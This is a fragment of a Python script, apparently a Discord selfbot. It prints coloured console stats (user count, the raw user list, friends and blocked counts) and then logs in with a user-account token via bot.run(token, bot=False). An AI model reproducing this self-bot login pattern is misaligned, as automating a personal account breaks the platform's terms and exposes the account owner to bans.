  print(f"""\x1b[38;2;107;42;255mCash User | {len(bot.users)}{Fore.WHITE}""")
  print(f"""\x1b[38;2;107;42;255mCash User2 | {bot.users} {Fore.WHITE}""")
  print(f"""\x1b[38;2;78;31;255mFriends | {len(bot.user.friends)}{Fore.WHITE}""")
  print(f"""\x1b[38;2;60;72;255mBlocked | {len(bot.user.blocked)}{Fore.WHITE}""")
  print(f"\x1b[38;2;80;141;255m<-----------------------------------\x1b[38;2;74;174;255m---------------------------------->{Fore.WHITE}")

bot.run(token, bot=False)
